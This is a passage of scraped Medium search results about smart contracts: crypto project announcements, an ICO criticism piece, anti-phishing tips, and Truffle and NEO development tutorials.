vesting schedule.In today\u2019s market, where some of the newly listed ICO\u2019s have fallen to 1/100th of their value after their listing, owing to the disproportionate release of tokens, we feel it is very important to follow a precautionary pathway. We would like to mention that we acknowledge that the vested release of tokens for some of the promoters has made them unhappy, however, we have enforced it in the interest of our\u2019s as well as their\u2019s community as a whole. We are certain that their continued belief and patience shall turn to be fruitful for all in the long run.All the changes have been done after thorough analysis and compliance check.We hope this delights all our ICO Participants, some of whom have expressed their concerns about the vested tokens that had been released earlier, which we have analyzed and felt the need to take appropriate actions as mentioned in the announcement above.If you have any more concerns, feel free to drop a mail to info@swachhcoin.com.Looking forward to your continued support.Best WishesTeam Swachhcoin", "responses": "2"}, {"title": "TrueUSD Smart Contract Upgrade\u00a0Note", "author_name": "TrustToken", "link": "https://blog.trusttoken.com/scnote-33ec9f1fdb32?source=search_post", "post_date": "Jan 10", "readtime": "", "upvotes": "44", "content": "TrueUSD Smart Contract Upgrade\u00a0NoteTrustTokenBlockedUnblockFollowFollowingJan 10Dear TrueUSD community, we would like to make sure that all questions from the recent TUSD smart contract upgrade are clearly answered. Here are some important clarifying points from our engineering department.The TUSD smart contract was upgraded on Jan 3rd to include several new features for traders, exchanges, and developersThe new smart contract address is 0x0000000000085d4780B73119b644AE5ecd22b376All TUSD has been automatically moved over and you do not need to do anything to upgrade your TUSDIf you are a TUSD trader or holder, there is nothing you need to do. Going forward, use the new smart contract address for transferring your TUSD and checking your balanceIf you run an exchange or app, please update your code to the new smart contract address if you haven\u2019t already done soWe do not expect to have to change the address again going forwardSpecial note for if you run a decentralized exchange or dapp: we understand that you might not be able to update to the new address and we anticipated this. The old address continues to work, it just forwards all calls such as transfer() to the new address.", "responses": "2"}, {"title": "Lympo smart contract and safety tips: read carefully", "author_name": "Lympo", "link": "https://medium.com/lympo-io/lympo-smart-contract-and-safety-tips-read-carefully-ba5760701d5f?source=search_post", "post_date": "Jan 20, 2018", "readtime": "3 min read", "upvotes": "30", "content": "Lympo smart contract and safety tips: read carefullyLympoBlockedUnblockFollowFollowingJan 20, 2018We thank all our loyal followers and users for being so involved in our journey to become the best health and wellness ecosystem in the planet.Smart contract bug\u00a0bountyBefore starting the token pre-sale that we launch on January 22 for our whitelist Stage I participants (all information will be communicated via email), we want to share with you our smart contract and to offer a 5 ETH bug bounty valid until Sunday 23:59 GMT+1.Here you can view our audited smart contract for the token sale. While we did an expert audit, we still want to share it with our community.Please contact us on Telegram if you notice any issues. Let\u2019s make this work as smoothly as possible.Safety tipsPlease take a look at these following tips, dos and don\u2019ts. We want you to enjoy the Lympo experience, and not to be scammed.Website:Please remember to do two things before you begin anything on Lympo. Ensure that you are on the right domain, which is https://lympo.io and please verify if an SSL certificate has been enabled. You can find that right next to the HTTPS, where is says \u2018Secure\u2019. Once you\u2019ve checked that, you\u2019re good to go.Emails:We sometimes send important emails to you, but please be careful and ensure that any email coming from us ends with lympo.io or lympo.lt. If it doesn\u2019t, then the email isn\u2019t ours. If you are not sure, as the email is sent via a mailing service and might look strange before you click on it, contact us on Telegram and ask.Telegram:Do remember that we have only 6 administrators who manage Lympo\u2019s Telegram and no one else. If you are contacted by anyone else other than @adajonu, @Ziville, @mariusAI, @DomGov, @alphet or @Maurukas, please don\u2019t respond to it. Their unique Telegram handles are what you need to watch out for.If you are not sure about something or find anything suspicious please feel free to ask a question on Telegram and we assure you that you will receive an answer from one of our 6 admins.- Please note that we will NEVER contact you personally on Telegram.- We will NEVER ask you to send any contributions in advance to a different smart contract than the one on our website.So, whenever you feel that something is a little fishy, please contact us immediately. We care more about our users than anything else and we want to ensure that your time with us is as safe as it can be.Token pre-saleThe only smart contract address to which you will have to transfer ETH will be on our website. We will not send it via email. Our whitelisted participants will get a unique password to access that part of the website before the public pre-sale starts.After the public pre-sale starts on January 23 at 12:00 GMT+1, it will be visible for everyone on our website.The website will show the full smart contract address which you can just copy and insert, but we will have a video next to it, so that you can verify the last 8 digits of the smart contract displayed on the website and check if they are the same as on the video.", "responses": ""}, {"title": "Bytom Smart\u00a0Contract", "author_name": "BYTOM BLOCKCHAIN", "link": "https://medium.com/@Bytom_Official/bytom-smart-contract-f0f79a476d8f?source=search_post", "post_date": "Jul 24, 2018", "readtime": "2 min read", "upvotes": "137", "content": "Bytom Smart\u00a0ContractBYTOM BLOCKCHAINBlockedUnblockFollowFollowingJul 24, 2018After the successful launch of the main network in April, nearly three months later, Bytom is about to usher in a new milestone: smart contract release.The release of smart contract also marks the establishment of its core, which will further promote the commercialization of the project. Bytom uses its own Equity language, which is a Turing complete and interpretive high-level language. It is convenient to operate the assets on Bytom and flexibly integrate into various asset business scenarios.Equity language\uff1ahttps://github.com/Clarenous/equity-abc/blob/master/docs/equity-abc.md?from=timeline&isappinstalled=0Bytom released seven contract templates at the same time as the contract language. In addition to three basic transaction templates, there are four templates with strong business meaning that provide a lot of imagination space.Coin-to-coin trading contractAccording to this contract\uff0cusers can trading multi-assets on Bytom without centralized institutions.Users can lock part asset by contract\u00a0.This part of asset can only be unlocked when others deposit a specified number of assets.Trusted third party custodian contractAccording to thiscontract\uff0cusers can transfer specified asset to third party account and then third party decides whether it should be transferred to specified account ot return to former account.The trusted third party custodian contract eliminates the possibility of third party account cheating.Mortgage contractThrough this contract, the borrower with borrowed asset and the lender with mortgage assets will be sent to the same contract, the lender will acquire the assets of the borrower, and if the lender fails to return the assets of the borrower at somewhich block height, the borrower will automatically acquire the mortgage assets of the lender.Call option contractthrough this contract\uff0casset issuer could sell a asset in specific price and so does purchasers.when it\u2019s over a specified block height\uff0cleft assets will return to issuers.The release of smart contract and contract template means that Bytom has entered a new stage. The rapid development of Dapp through smart contract will greatly accelerate Bytom ecological progress and vision implementation.", "responses": ""}, {"title": "DEx.top, incubated by BITMAIN Overseas, Lists PAI, Partner to Develop Large-Scale Smart Contract Applications", "author_name": "PCHAIN", "link": "https://medium.com/pchain-org/bitmain-s-exchange-dex-top-lists-pai-partner-to-develop-large-scale-smart-contract-applications-c0b6f0d9c266?source=search_post", "post_date": "Jul 24, 2018", "readtime": "2 min read", "upvotes": "64", "content": "DEx.top, incubated by BITMAIN Overseas, Lists PAI, Partner to Develop Large-Scale Smart Contract ApplicationsPCHAINBlockedUnblockFollowFollowingJul 24, 2018Decentralized exchange DEx.top opened deposits for PAI on 23 July. Trading began shortly after at 1PM on 24 July. Users stand to receive tokens when they deposit PAI as well as a 200% rebate on trading fees during the promotional launch campaign, so hurry before it\u2019s gone!PCHAIN is the world\u2019s first native multichain system to support the EVM and features an innovative PDBFT consensus algorithm as well as a Smart Data Oracle mechanism based off their knowledge graph. PCHAIN also supports smart contract invocation with non-native tokens, addressing the issues of blockchain performance, incompatible smart contracts and reliance on external data in a step towards large-scale industrial applications of smart contract technology.PCHAIN aims to \u201cmake large-scale blockchain applications possible\u201dand make blockchains as accessible and effortless as the Internet is today. On the other hand, DEx.top aims to develop financial infrastructure with a global reach and promote robust and healthy development of the blockchain industry. This partnership will allow the two teams to work towards their common goal of driving the blockchain industry\u2019s development in tandem.Additionally, PCHAIN has accumulated technical expertise developing smart contracts, particularly multi-chain and cross-chain capabilities. With this architecture, the main chain is used to store account information, settle digital currency transactions and communicate with other public chains as well as provide relevant services to sidechains. In terms of cross-chain technology, PCHAIN has primarily managed to bridge the gap between capital and assets.DEx.top has also invested large amounts of R&D into multichain and cross-chain technology and plans to integrate these capabilities into its product offerings. Both DEx.top and PCHAIN will work even more closely in the future to drive the development of large-scale smart contract applications.PCHAIN Project Progress:- 200 nodes reached consensus based on its self-developed PDBFT consensus algorithm and successfully packaged transactions as well as generated blocks- Crossed continent test successfully with 30 nodes based on PDBFT algorithm and successfully packaged transactions as well as generated blocks- Finished coding of dynamic validator join/leave process with bidding.- Finished coding of transferring balance from main chain to child chain.- Received \u201cmost promising cross-chain infrastructure/protocol of the year\u201d award from the Global Blockchain Technology Expo 2018, and was selected as the best blockchain platform of 2018 by Bitcoinist.Project Website: https://pchain.org/Project Whitepaper: https://pchain.org/js/generic/web/viewer.htmlLink to Campaign: https://support.dex.top/hc/zh-cn/articles/360007258034-%E5%85%85%E5%80%BCPAI%E9%A2%86Token-%E4%BA%A4%E6%98%93%E8%BF%94%E5%8F%8C%E5%80%8D%E6%89%8B%E7%BB%AD%E8%B4%B9About DEx.topDEx.top is an Ethereum-based decentralized exchange incubated by Bitmain.DEx.top pioneered the Replayed On Chain (ROC) mechanism, which uses a system of two ledgers for off-chain matching and on-chain settlement to enable instant trades and lowered gas costs. User assets are held by secure and transparent smart contracts; the non-custodial platform only provides matching services and does not store any users\u2019 private keys so as to provide a safe and reliable trading experience. DEx.top aims to provide a safe, instant and low-cost digital asset exchange experience and serve as a user-friendly decentralized exchange regardless of each users\u2019 experience and requirements.Website: https://dex.topOriginal content link: https://www.jinse.com/bitcoin/217747.html", "responses": "1"}, {"title": "Heap-Sort in Golang, avoiding deadlocks, a smart contract language in Go &\u00a0more", "author_name": "Jexia\u2019s Editorial Team", "link": "https://medium.com/jexia/heap-sort-in-golang-avoiding-deadlocks-a-smart-contract-language-in-go-more-961f4e6d558b?source=search_post", "post_date": "Jan 21", "readtime": "5 min read", "upvotes": "10", "content": "Heap-Sort in Golang, avoiding deadlocks, a smart contract language in Go &\u00a0moreJexia\u2019s Editorial TeamBlockedUnblockFollowFollowingJan 21I\u2019m Maarten, curator of this weekly Golang Ninja Newsletter and use Go to build the back-end of developer platform Jexia. Just learning Golang? Look into my Master the World of Go newsletter. Newsletters are sent on Fridays and crossposts on Medium follow some days after their releases. Medium posts don\u2019t include VC backed Go jobs at startups.", "responses": ""}, {"title": "Alarming feature in ICO industry - ICOs without smart contract.", "author_name": "Filip Poutintsev", "link": "https://hackernoon.com/alarming-feature-in-ico-industry-icos-without-smart-contract-f45cf86dcc5b?source=search_post", "post_date": "Jun 6, 2018", "readtime": "3 min read", "upvotes": "171", "content": "Alarming feature in ICO industry - ICOs without smart contract.Filip PoutintsevBlockedUnblockFollowFollowingJun 6, 2018When first ICOs came out they were honestly raising money to their smart contract. They were transparent and anyone could see how much money they had really raised. Sadly the good times are now over.Today most ICOs hide their investments and you can no longer track their activity or check if they are lying. But quite recently some ICOs start to raise funds in a way that is close to a scam: they do it completely without a smart contract.Unfortunately there are quite many such ICOs, but we will discuss here about the one who does this in the dirties way: Fetch AI.You see many ICOs that don\u2019t have smart contract still state on their website that they are indeed an ICO, have specific amount of tokens and a hardcap. The only problem is that you cannot find their token on Etherscan.But Fetch goes beyond that. On their website there is no information about ICO sale, but out of sight they are aggressively pushing their fundraising: contacting ICO investors and different ICO pools and begging for money. If you ask about this in their Telegram group they will lie about it and you will get banned.The amount of raise by Fetch is unknown, but I hope for investors sake that it\u2019s low. In order to tempt investors Fetch is claiming that price of their tokens will raise after every sale they make. But there is no proof if this will happen for real.So what is it like to invest in Fetch (or to another ICO that has no smart contract)?It\u2019s not an ICO, and may never beThere may never be any tokens.The whole fundraising may be a giant scam.You are not investing. You are giving money for free and hoping that you will receive one day something in exchange.Hardcap is unknown and probably very huge. Token will be sold to everyone who wants them and therefore after token sale will be finished there will be no demand anymore.Number of tokens may be subject to change and if there is more demand they will be printed like fake money.Price may go up and down without your knowledge. You may buy tokens for 1$, but after a month they will be sold for 0,50$.Token sale may last for ages. And since it\u2019s not publicly announced they will still tell new investors after a year that they just begun raising money.It may take years before tokens will be released and get listed in exchange, which will result in massive dump from frustrated investors.The team may reserve huge amount of tokens for themselves (e.g. 90%) and manipulate the market after they get listed in exchanges.So are you still thinking of investing in ICO that has no smart contract? Don\u2019t be fooled. Always check Etherscan!", "responses": "2"}, {"title": "Smart Contract\u00a0Audit", "author_name": "Team Nimiq", "link": "https://medium.com/nimiq-network/nimiq-token-and-token-sale-audit-486e1994c462?source=search_post", "post_date": "Jun 23, 2017", "readtime": "", "upvotes": "6", "content": "Smart Contract\u00a0AuditAudit ResultsTeam NimiqBlockedUnblockFollowFollowingJun 23, 2017A few days ago we published the Contribution Smart Contract code for peer review. Backes Security and Research Technologies today released their security audit:https://data.backes-srt.com/nimiq_9bf53b254b/audit_v1.3.pdfThe last commit that was reviewed was: 8c0d545272f67f3fb07dc533490c736a39aee680 athttps://github.com/nimiq-network/nimiq-exchange-tokenWe are glad to report that besides the items that were identified\u200a\u2014\u200aand that we worked through with them during the review period\u200a\u2014\u200ano outstanding issues have been found and all concerns were addressed adequately.Bug Bounty\u00a0RewardSmart contract security audits like this one, significantly reduce the risks of the smart contracts issues but they can not warrant bug-free code. Our Bug bounty program remains open with a reward of US$5'000 for discovery and responsible disclosure of issues that represent a tangible security threat for the contributions. Importantly, such bug reports need to classify as actually executable under a realistic attack scenario. Eligible bugs are:Security threats: incorrect ETH/NET allocationDoS: incorrect execution of the contracts through malicious actor (stuck in invalid, irrecoverable state)Logical errors: issues in the contract that lead to significant deviation from specified intention and terms", "responses": ""}, {"title": "Solidity CRUD Tutorial, Part 2\u200a\u2014\u200aTesting Your Smart Contract with\u00a0Truffle", "author_name": "Gaurav Agrawal", "link": "https://medium.com/crowdbotics/solidity-crud-tutorial-part-2-testing-your-smart-contract-with-truffle-3866f3ce2c66?source=search_post", "post_date": "Oct 9, 2018", "readtime": "5 min read", "upvotes": "26", "content": "Solidity CRUD Tutorial, Part 2\u200a\u2014\u200aTesting Your Smart Contract with\u00a0TruffleTesting a Solidity smart contract using Truffle frameworkGaurav AgrawalBlockedUnblockFollowFollowingOct 9, 2018In the last tutorial, we have created a smart contract which performs some basic CRUD (create, read, update, delete) operation, let\u2019s test that smart contract using Truffle.Truffle\u200a\u2014\u200aTruffle is the most popular development and testing framework for developing ethereum smart contracts.Installing TrufflePrerequisitesNodeJSNode Package Manager (NPM)InstallationFirst, we need to install the Truffle packagesudo npm install -g truffleVerify that it has been downloaded successfully by runningtruffleChoose a directory and runtruffle initIt will create a directory structure and create few files.Let\u2019s go to these directories one by one an will understand what they are.contracts/: Directory for Solidity contractsmigrations/: Directory for scriptable deployment filestest/: Directory for test files for testing your application and contractstruffle.js: Truffle configuration fileWe will use truffle develop to test our smart contract. Truffle gives us inbuilt development blockchain with ethereum accounts.Let\u2019s create a file with CrudApp.sol (Notice, same name as our contract name) under contracts directory and paste our smart contract code.Let\u2019s compile our smart contract using,truffle compileIt may show some warnings but let\u2019s ignore them for now. Open our development console using,truffle developIt will show an output something like below:Truffle Develop started at http://127.0.0.1:9545/Accounts:(0) 0x627306090abab3a6e1400e9345bc60c78a8bef57(1) 0xf17f52151ebef6c7334fad080c5704d77216b732(2) 0xc5fdf4076b8f3a5357c5e395ab970b5b54098fef(3) 0x821aea9a577a9b44299b9c15c88cf3087f3b5544(4) 0x0d1d4e623d10f9fba5db95830f7d3839406c6af2(5) 0x2932b7a2355d6fecc4b5c0b6bd44cc31df247a2e(6) 0x2191ef87e392377ec08e7c08eb105ef5448eced5(7) 0x0f4f2ac550a1b4e2280d04c21cea7ebd822934b5(8) 0x6330a553fc93768f612722bb8c2ec78ac90b3bbc(9) 0x5aeda56215b167893e80b4fe645ba6d5bab767dePrivate Keys:(0) c87509a1c067bbde78beb793e6fa76530b6382a4c0241e5e4a9ec0a0f44dc0d3(1) ae6ae8e5ccbfb04590405997ee2d52d2b330726137b875053c36d94e974d162f(2) 0dbbe8e4ae425a6d2687f1a7e3ba17bc98c673636790f1b8ad91193c05875ef1(3) c88b703fb08cbea894b6aeff5a544fb92e78a18e19814cd85da83b71f772aa6c(4) 388c684f0ba1ef5017716adb5d21a053ea8e90277d0868337519f97bede61418(5) 659cbb0e2411a44db63778987b1e22153c086a95eb6b18bdf89de078917abc63(6) 82d052c865f5763aad42add438569276c00d3d88a2d062d36b2bae914d58b8c8(7) aa3680d5d48a8283413f7a108367c7299ca73f553735860a87b08f39395618b7(8) 0f62d96d6675f32685bbdb8ac13cda7c23436f63efbb9d07700d8669ff12b7c4(9) 8d5366123cb560bb606379f90a0bfd4769eecc0557f1b362dcae9012b548b1e5Mnemonic: candy maple cake sugar pudding cream honey rich smooth crumble sweet treat\u26a0\ufe0f  Important \u26a0\ufe0f  : This mnemonic was created for you by Truffle. It is not secure.Ensure you do not use it on production blockchains, or else you risk losing funds.truffle(develop)>Your accounts and private keys will be different than mine.Now we have accounts ready and our development blockchain spun up, we can test our smart contract.Before that, let\u2019s run few commands and test the balance of our accounts. Replace my account number with your account in the command below.web3.eth.getBalance(\u201c0x627306090abab3a6e1400e9345bc60c78a8bef57\u201d)Result - BigNumber { s: 1, e: 20, c: [ 1000000 ] }As you can see, above command gives result in BigNumber. You need to convert that into number format using\u00a0.toNumber() function.web3.eth.getBalance(\"0x627306090abab3a6e1400e9345bc60c78a8bef57\").toNumber()Result -  100000000000000000000This shows balance in WEI (smallest ethereum unit / 1 ethereum = 1\u2070\u00b9\u2078 wei). To convert this into the ether, you need to use web3.fromWei() function.web3.fromWei(web3.eth.getBalance(\u201c0x627306090abab3a6e1400e9345bc60c78a8bef57\u201d).toNumber())Result - '100' <<< Number of ethereum on the test account Image sourceNow, we need to deploy our smart contract.You can use either deploy command or migrate command. You don\u2019t need to prefix truffle with commands on truffle CLI.deploy or migrate You can use reset flag (\u200a\u2014\u200areset) while redeploying your contracts to get the initial state of the blockchain.Test Cases-Now let\u2019s write some test cases to test our smart contract.Create a file CrudApp.js (name should be same as smart contract file) under test directory and copy below code.const CrudApp = artifacts.require('./CrudApp.sol')const assert = require('assert')let crudInstance;contract('CrudApp' , (accounts)  => { beforeEach(async () => {  crudInstance = await CrudApp.deployed() })it('should insert new user' , async() => {  await crudInstance.insert(\"USA\" , \"Trump\", 30000000);const country = await crudInstance.getCountry(\"USA\");  assert.equal(country[0] , \"USA\");  assert.equal(country[1] , \"Trump\");  assert.equal(country[2].toNumber() , 30000000);await crudInstance.updateLeader(\"USA\" , \"Hillary\");const country1 = await crudInstance.getCountry(\"USA\");  assert.equal(country1[0] , \"USA\");  assert.equal(country1[1] , \"Hillary\");  assert.equal(country1[2].toNumber() , 30000000);await crudInstance.deleteCountry(\"USA\");const total = await crudInstance.getTotalCountries();  assert.equal(total , 0); })})Let\u2019s walk through our code and understand it.We imported our contract and assert library, which created an instance of our contract after deploying it (CrudApp.deployed()). Then we simply wrote three test case in which we are testing all four operations.First, we are inserting a record and then updating and deleting it, respectively.You can write test cases in Solidity too, but we choose Javascript, as Truffle makes it easy to test our contract.You can also run few commands directly on Truffle console and also interact with our smart contract using Truffle CLI (Command Line Interface).truffle(develop)>  Above is what we calling Truffle CLI. Running commands on truffle.  Let\u2019s get an instance of our smart contract using this command.CrudApp.deployed().then(function(instance) { crud = instance;})This will give us an instance (crud) of our smart contract, let\u2019s play with it. This instance is simple ABI (Application Binary Unterface) you can check it just printing crud.ABI is the interface between two program modules, one of which is often at the level of machine code. The interface is the de facto method for encoding/decoding data into/out of the machine\u00a0code.Let\u2019s check the total number of countries by running this command.crud.getTotalCountries().then(function(num){var str= num.toString(); console.log(str)});Let insert a new countrycrud.insert(\"USA\",\"Trump\",30000000);The result should be something like this.{ tx: '0x6502bd013b41f246e31f071690ffb1c8f41d21c4cddbad8bb99bf53d9ac6c982',  receipt:    { transactionHash: '0x6502bd013b41f246e31f071690ffb1c8f41d21c4cddbad8bb99bf53d9ac6c982',     transactionIndex: 0,     blockHash: '0x297ed89cf22d78956e019100fd15ece49882124ba6d23476c4e48914d3da35f3',     blockNumber: 42,     gasUsed: 129230,     cumulativeGasUsed: 129230,     contractAddress: null,     logs: [ [Object] ],     status: '0x01',     logsBloom: '0x},  logs:    [ { logIndex: 0,       transactionIndex: 0,       transactionHash: '0x6502bd013b41f246e31f071690ffb1c8f41d21c4cddbad8bb99bf53d9ac6c982',       blockHash: '0x297ed89cf22d78956e019100fd15ece49882124ba6d23476c4e48914d3da35f3',       blockNumber: 42,       address: '0x8f0483125fcb9aaaefa9209d8e9d7b9c8b9fb90f',       type: 'mined',       event: 'CountryEvent',       args: [Object] } ] }This is transaction receipt you can see that our country event gets fired too. Whenever you change blockchain state, it has to be a transaction and transactions consume gas.Now let\u2019s check our entry by running this commandcrud.getCountry(\"USA\");You should see a result something like this.[ 'USA', 'Trump', BigNumber { s: 1, e: 7, c: [ 30000000 ] } ]You\u2019ve now learned how to interact with smart contract, and how to test it!Show me what you\u2019ve built in the comment section.ConclusionWe have learned how to do basic CRUD operations using solidity and test our smart contract. We cut down on details which can be overwhelming for the sake of brevity. Solidity and Truffle have extensive documentation and you should read them. Also, we used web3.js which comes with Truffle bundle.There are multiple ways to optimize our CRUD operations (Hint\u00a0: you can use an external array). Optimize it and let us know.It\u2019s time for some \ud83d\udc4f.", "responses": "1"}, {"title": "Important Update: Lottery smart contract template Development", "author_name": "DAO.Casino Team", "link": "https://medium.com/@dao.casino/important-update-lottery-smart-contract-template-development-2db576ababed?source=search_post", "post_date": "Jun 7, 2018", "readtime": "2 min read", "upvotes": "71", "content": "Important Update: Lottery smart contract template DevelopmentDAO.Casino TeamBlockedUnblockFollowFollowingJun 7, 2018We\u2019d love to uncover our next big game template, which is Lottery! The development team has introduced a series of updates to the Lottery section of the DAO.Casino\u2019s protocol to further enhance its operation.Lottery IntroductionFirst and foremost, illustrations have been created and added on the Lottery\u2019s page, and the website design has been completely formed. A new system for obtaining a random order for issuing winning tickets has also been introduced.ProgrammingThe smart contract responsible for checking the winning ticket and issuing a x10 multiplier has been fixed. The development team has also added an additional test for calling the method of \u201cgenerating a winning ticket\u201d. As part of our ongoing efforts aimed at perfecting the system, we have updated the the contracts to Solidity version 0.4.24. As a result, we have also updated the tests for the Lottery contract template and have achieved 91% coverage.WebsiteThe desktop version of the Lottery\u2019s website showcase is now at 78% readiness and includes the following fully operational sections:\u00b7 Homepage \u00b7 Ticket purchases \u00b7 Modals \u00b7 Results \u00b7 Player Profile \u00b7 Game rulesAs part of our ongoing efforts to finalize the website, we have started our programming procedures to create the Lottery page, which will include the following pages:\u00b7 User registration / authorization \u00b7 Ticket purchasing \u00b7 Windows (transactions, errors, prizes)SummarySmart contract data extraction is also being implemented as part of our tuning work and formulation of the Lottery\u2019s website showcase to ensure full operational capacities and user convenience.Moreover, we are now preparing Lottery\u2019s smart contract template to audit process, maintaining coordination between Ethereum blockchain and Lottery\u2019s website showcase and solving legal questions, considering usage of our game.The development team is continuing to exert every effort to achieve the best results possible. We are working hard to make sure the website is up and running on time so our gamers and other platform participants can enjoy the best experience possible. Stay tuned for more news and updates from the development team in our blog.DAO.Casino Essential LinksWebsite: https://dao.casinoGitHub: https://github.com/daocasinoRoadmap https://platform.dao.casino/roadmap05.06.pdfEmail: a@dao.casinoTelegram: https://t.me/daocasinoFacebook: https://www.facebook.com/Dao.casino/Twitter: https://twitter.com/daocasinoBlog: https://medium.com/@dao.casino/YouTube: https://www.youtube.com/channel/UCkggi9VnPJ0qUzfj7h70-pQ", "responses": ""}, {"title": "Trying our Token Auction Smart\u00a0Contract", "author_name": "CodeTract", "link": "https://medium.com/@codetractio/trying-our-token-auction-smart-contract-cfeab8814326?source=search_post", "post_date": "Mar 6, 2017", "readtime": "3 min read", "upvotes": "10", "content": "Trying our Token Auction Smart\u00a0ContractCodeTractBlockedUnblockFollowFollowingMar 6, 2017We have recently deployed our Token Auction on Ethereum and it is located at0x48F230D47914cBE8F223344b7763f064336e8FA5Token Auction is a smart contract on Ethereum that enables on-chain exchange of standard tokens. In this iteration, settlement happens once a day with an externally fed but publicly verifiable settlement price. An external price is used instead of the equilibrium price so as to jump-start the liquidity of the auction and prevent price gaming due to initial low liquidity. It is an alternative to centralized and decentralized exchanges and is the primary way to obtain our gold token, GCT.The natural question is, how can one easily interact with it? Ethereum is still under heavy development including many plans for better user experience but now we will require some tools to interact with the auction. Fortunately, we have created a gui for it which can be accessed athttps://gcteth.codetract.ioTry to visit it in a normal web browser and it should display the message \u201cNo Network Found\u201d. This is because the browser is not connected to the Ethereum network and is unable to interact with the smart contract. One program that can connect to the Ethereum network is Mist. You will need to download and run the program. It is a gui to a Golang implementation of an Ethereum node (geth). Do note that it could take some time for it to work as it will need to download the historical transactions so that it can verify that your copy of the chain is valid. Once that is done, you can follow the below gif to access the auction.Access auction in MistYou should be able to see values such as time left and last session's price being read from the smart contract. Furthermore clicking on the buttons allow you to participate in the auction to buy or sell GCT.Similar to Mist, there is also a Rust implementation of a node (Parity). With Parity running, you would be able to access the auction from a normal web browser as seen in the gif below.Access auction in ParityAnother simpler way is to use MetaMask. It is a chrome plug-in and does not require the download of historical transactions thus can be used right away. With MetaMask installed, you can access the auction as seen in the gif below.Access auction with MetaMaskAfter getting your hands on some GCT, you will be able to transfer it like any standard token. You can add GCT in Mist as seen in the gif below to easily check your balance and transfer it to another address.Add GCT in MistYou can also check your GCT balance at our gold site or at a block explorer. Do try out our auction with small amounts and let us know what you think! You can sell back the GCT for ether.For more information on our projects, visit our website and read our whitepaper.Follow us on Twitter and Medium for more updates!", "responses": ""}, {"title": "Neo Smart Contract Development\u200a\u2014\u200aPart\u00a01", "author_name": "Gaurav Agrawal", "link": "https://medium.com/coinmonks/neo-smart-contract-development-part-1-8da56e991521?source=search_post", "post_date": "May 14, 2018", "readtime": "6 min read", "upvotes": "54", "content": "Neo Smart Contract Development\u200a\u2014\u200aPart\u00a01Prerequisites and RecommendationsGaurav AgrawalBlockedUnblockFollowFollowingMay 14, 2018Find crypto jobs using Coinmonks jobs portalDonate to CoinmonksClick to find blockchain JobsPurposeThe purpose of this activity is to for you to ensure you have Windows environment that is compatible with the list of 10 activities described in this document (and to save you a lot of time if your environment isn\u2019t compatible).Goals, Non-Goals and AssumptionsThe goal of this activity is to inform you about the minimum and recommended pre-requisites for successful execution of the remaining acitivities in Quick Start Guide for Windows\u00a0.NET Developers.PrinciplesProvide reliable documentation: timely, accurate, visual, and completeSave as much of a person\u2019s time as possibleDriversLack of an existing set of concise and easy to follow documentationPrerequisites and RecommendationsThe basic hardware and software prerquisites are that you have a computer (PC or laptap) with:Microsoft Windows 10 64-bit Pro, Enterprise and Education edition operating system (1607 Anniversary Update, Build 14393 or later)The current version of Docker for Windows runs on 64bit Windows 10 Pro, Enterprise and Education (1607 Anniversary Update, Build 14393 or later). [DOCKER]Windows 10 Home edition can\u2019t be used because it doesn\u2019t include the Hyper-V feature and hence, the Hyper-V service can\u2019t be installed/enabled and the NEO Docker container can\u2019t be use for deploying and testing NEO smart contracts. The Hyper-V service is a pre-requisite for installing Docker.Figure 0.1. Windows 10 Home edition doesn\u2019t include the Hyper-V\u00a0featureNOTE: If you want to use a fresh clean Windows 10 Enterprise edition (Evaluation\u200a\u2014\u200aBuild 201712) environment (and you are running the Hyper-V service on your physical computer), consider downloading and running the \u201cWindows 10 Dev Environment\u201d virtual machine image. If is available for the following hypervisors: VMWare, Hyper-V, VirtualBox, and Parallels. Checkout https://developer.microsoft.com/en-us/windows/downloads/virtual-machines.Latest Windows Updates installed8GB of RAM (16GM or more prefered because you need to install and enable the Hyper-V feature and service)50GB of free disk space (100GB ore preferred because you will eventually have multiple copies of the NEO blockchain files downloaded on to your machine)An SSD (solid state drive) is preferred over a conventional hard drive (HDD) for perfomance reasons but it\u2019s not a necessityThe activities in this document were tested with the following configurations:Windows 10 Pro edition Levnovo laptop, 32GB RAM, 500GB SSD + 500GB HDD, Intel i7 processor, Virtualization Technology enabled in BIOSThe installation succeededWindows 10 Enterprise edition (Evaluation\u200a\u2014\u200aBuild 201712) virtual machine (referred to above), 2GB RAMOnly the Docker installation was tested and it did not succeed. Not all of the required Hyper-V services were available for Docker to start without failing.The Visual Studio installation requires a key (no evaluation key is provided with the VM)Windows 10 Home edition HP laptop, 8GB RAM, 1TB HDD, Intel i5 processor, Virtualization Technology enabled in BIOSThe installation failed because Windows 10 Home edition doesn\u2019t include the Hyper-V feature and hence, the service can\u2019t be installed/enabled and the NEO Docker container can\u2019t be use for deploying and testing NEO smart contracts.Create your NEO Working\u00a0FolderThis folder will be used for all of your NEO development work. It is the folder where you will download and build various NEO developer tools to as well as where you might choose for your own NEO solutions.In Windows Explorer/File Manager or using the Command Prompt or Powershell, create youe local \u201cNEO\u201d folder:C:\\NEOThis is the recommended folder name but you can choose an alternate folder as well.NOTE: Some of the path names used in the NEO Project projects can be quite long.Install the Hyper-V Service on your Windows 10\u00a0computer2. Inspect the Virtualization Technology setting in your computer\u2019s BIOS by starting Windows Task Manager and selecting the Performance tab; then select CPU.Figure 0.2. Task Manager: Inspect the BIOS Virtualization Technology Setting (Disabled)3. In Task Manager, if the Virtualization setting is Disabled, you need to power down computer; then restart it - pressing F10 to enter the BIOS Setup Utility (similar to the following). Change the Virtualization Technology setting to Enabled; save and exit from the BIOS Setup Utility. Reboot your commputer.Figure 0.3. BIOS Setup Utility: Virtualization Technology Setting (change to Enabled; then save and\u00a0reboot)4. To verify the Virtualization Technology setting in your computer\u2019s BIOS is Enabled, login to your computer and start Windows Task Manager again; selecting the Performance tab; then select CPU. Virtualization should now be Enabled.Figure 0.4. Task Manager: Verify the BIOS Virtualization Technology Setting (Enabled)5. To install the Hyper-V service, click the Windows start menu and type \u201cTurn Windows Features on or off\u201d. Scroll down until you find Hyper-V and select it (a checkmark should appear in the box). If the the Hyper-V box is already checked, then the Hyper-V service is already installed and you *don\u2019t have to change this setting.Figure 0.5. Windows Features: Turn Windows Features on or\u00a0offIf you don\u2019t see the Hyper-V feature in the list at all, it is likely because you are running Windows 10 Home edition on your computer. Find a computer with Windows 10 Pro, Enterprise or Academic edition or upgrade the operating system on your computer to one of these versions of Windows 10.Figure 0.6. Windows Features: Windows 10 Home edition doesn\u2019t include the Hyper-V\u00a0featureIf you insist on trying to continue, you\u2019re eventually going to run into this blocking problem in Activity 6\u200a\u2014\u200aDownload, install, and test Docker platform. Stop now while you\u2019re ahead.Figure 0.7. Windows Features: HyperV is not available in Home\u00a0editionsAfter selecting th 